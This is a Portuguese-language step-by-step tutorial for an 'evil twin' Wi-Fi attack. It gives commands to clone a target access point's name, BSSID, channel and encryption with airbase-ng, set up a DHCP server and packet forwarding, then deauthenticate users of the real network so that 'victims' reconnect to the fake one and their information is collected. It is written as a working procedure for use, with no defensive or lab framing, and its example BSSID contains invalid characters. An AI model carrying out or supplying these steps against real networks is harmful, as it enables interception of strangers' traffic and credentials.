O EVIL TWIN É UM ATAQUE EM QUE VOCÊ CRIA UM AP IDÊNTICO A OUTRO E DESAUTENTICA OS USUÁRIOS DA ORI
GINAL, PARA RELOGAREM NA SUA AP.
	
	CRIANDO UM PONTO DE ACESSO FALSO DE WIFI, PARA COLETAR INFORMAÇÕES DE USUÁRIOS.
	
	1.INSTALAR O DHCP SERVER.
		
		COMANDO: sudo apt-get install isc-dhcp-server
		
	2.ATIVAR O MODO MONITOR.
		
		COMANDO: airmon-ng start wlan0
		
	3.MATAR OS PROCESSOS.
		COMANDO: airmon-ng check kill
			
	4.CONFIGURAR O ENCAMINHAMENTO DE PACOTES.	
		
		1.PERMITIR O ENCAMINHAMENTO DE IP.
			
			COMANDO: echo 1 > /proc/sys/net/ipv4/ip_forward
			
		2.ROTEAR O TRÁFEGO DE SAÍDA SEM INTERROMPER O 
		FLUXO NORMAL DE TRÁFEGO NA REDE.
			
			COMANDO: iptables -t nat -A POSTROUTING -o wlan0mon -j MASQUERADE
			
	5.CONFIGURAR O DHCP.
		
		1.CONFIGURAR O ARQUIVO DO DHCP SERVER.
			
			COMANDO: nano /etc/default/isc-dhcp-server
			
			1.DESCOMENTAR O DHCPDv4_CONF.
			
			2.ADICIONAR UM 'at0' EM 'INTERFACESV4.
			
		2.CONFIGURAR O ARQUIVO DHCPD.CONF.
			
			COMANDO: nano /etc/dhcp/dhcpd.conf
			
			1.DESCOMENTAR SUBNET ATÉ A '}' DE OPTIONS ROUTERS.
			
			2.APAGAR AS LINHAS COMENTADAS DO ARQUIVO.
			
			3.COLOCAR O DNS 8.8.8.8 EM OPTIONS DOMAINS-NAME-SERVERS.
			
			4.ALTERAR O NETMASK PARA 255.255.255.0
			
			5.ALTERAR A SUBNET PARA O IP QUE DESEJAR.
			
			6.ALTERAR O RANGE DYNAMIC DE ACORDO COM A SUBNET INSERIDA.
				
				EXEMPLO: SUBNET 192.168.0.0
				
				DYNAMIC RANGE: 192.168.0.10 192.168.0.30
				
				SENDO ASSIM SERÃO ENDEREÇADAS ATÉ 20 MÁQUINAS NO SEU
				ROTEADOR.
			
			7.ALTERAR O OPTIONS ROUTERS DE ACORDO COM A SUBNET TAMBÉM.
				
				EX: SUBNET: 192.168.0.0
				
				OPTIONS ROUTERS: 192.168.0.1
				
			8.ALTERAR O OPTION BROADCAST DE ACORDO COM A SUBNET.
				
				EX: SUBNET: 192.168.0.0
				
				OPTIONS BROADCAST: 192.168.0.255
				
	6.ENCONTRAR AP ALVO.
		
		COMANDO: airodump-ng wlan0mon
	
	7.MONITORAR AP ALVO.
		
		COMANDO: airodump-ng --bssid bssid_alvo -w nome_arquivo -c canal_alvo wlan0mon
			
	8.CRIAR O EVIL TWIN.
		
		COMANDO: airbase-ng -e nome_ap_alvo -a bssid_alvo -c nmr_do_canal wlan0mon -Z 4
		
		O NOME_AP_ALVO TEM QUE SER IDÊNTICO AO ALVO E O NÚMERO DO CANAL TEM
		QUE SER O MESMO QUE O DO ALVO.
		
		O -Z 4 COPIA A CRIPTOGRAFIA DO AP ORIGINAL.
		
		EX: airbase-ng -e wifi_seguro -a F4:B3:FG:2L:EC:2B -c 11 wlan0mon -Z 4
				
	 9.SUBIR A INTERFACE at0 QUE ESTÁ NO ARQUIVO DHCP SERVER.
			
			COMANDO: ifconfig at0 ip_option_routers netmask 255.255.255.0 up
			
			EX: ifconfig at0 192.168.0.1 netmask 255.255.255.0 up
			
			OBS: O IP_OPTION_ROUTERS É O IP QUE FOI USADO NA CONFIGURAÇÃO DO DHCPD.CONF.
	10.INICIAR O SERVIÇO DHCP.
			
		COMANDO:  service isc-dhcp-server start
		
	11.DERRUBAR A REDE ORIGINAL.
		
		COMANDO: aireplay --deauth numero_de_desautenticações -a bssid_alvo wlan0mon
		
	12.AGORA AS VITIMAS QUANDO FOREM SE RECONECTAR, VÃO SE CONECTAR NA SUA EVIL TWIN.
